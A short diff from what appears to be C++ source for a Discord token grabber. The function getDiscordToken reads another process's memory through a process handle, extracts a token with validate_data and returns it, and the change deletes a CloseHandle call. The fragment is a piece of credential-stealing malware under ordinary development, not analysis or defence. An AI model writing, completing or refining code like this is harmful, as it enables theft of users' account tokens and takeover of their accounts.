@@ -27,7 +27,6 @@ std::string getDiscordToken() {
 					std::string token = validate_data(phandle, resh);
 					if (token != "") {
 						*&answer = token;
-						CloseHandle(phandle);
 						return;
 
 					};
